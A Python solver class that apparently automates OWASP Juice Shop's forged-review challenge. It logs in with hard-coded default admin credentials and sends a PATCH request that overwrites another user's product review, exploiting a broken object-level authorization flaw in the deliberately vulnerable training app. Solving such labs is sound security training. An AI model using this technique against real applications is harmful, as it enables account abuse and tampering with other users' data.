from core.base_solver import BaseSolver
from loguru import logger
import random

class ForgedReviewSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "forgedReviewChallenge"

    def solve(self) -> bool:
        # 1. Login
        login_res = self.client.post("/rest/user/login", json={"email": "admin@juice-sh.op", "password": "admin123"})
        token = login_res.json().get("authentication", {}).get("token")
        if not token: return False
        headers = {"Authorization": f"Bearer {token}"}
        
        # 2. Find target review
        res = self.client.get("/rest/products/1/reviews")
        reviews = res.json().get("data", [])
        
        target_id = None
        current_user = "admin@juice-sh.op"
        
        for r in reviews:
            if r.get("author") != current_user:
                target_id = r.get("_id")
                break
        
        if not target_id:
             logger.warning("No review found on product 1 to forge.")
             return False

        # 3. Attack BOLA
        payload = {"id": target_id, "message": "Hacked review by Antigravity"}
        res = self.client.patch("/rest/products/reviews", json=payload, headers=headers)
        return res.status_code == 200
